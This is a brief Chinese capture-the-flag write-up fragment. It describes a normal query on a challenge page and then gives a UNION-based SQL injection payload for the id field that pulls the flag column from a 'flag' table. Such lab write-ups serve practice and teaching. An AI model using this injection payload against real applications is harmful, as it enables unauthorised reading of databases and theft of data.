先正常查询，得到回复：
```
admin says: "The flag is stored in database."
```
然后再在id栏输入以下语句实现SQL注入：

```sql
3' UNION SELECT 1,database(),flag FROM flag#
```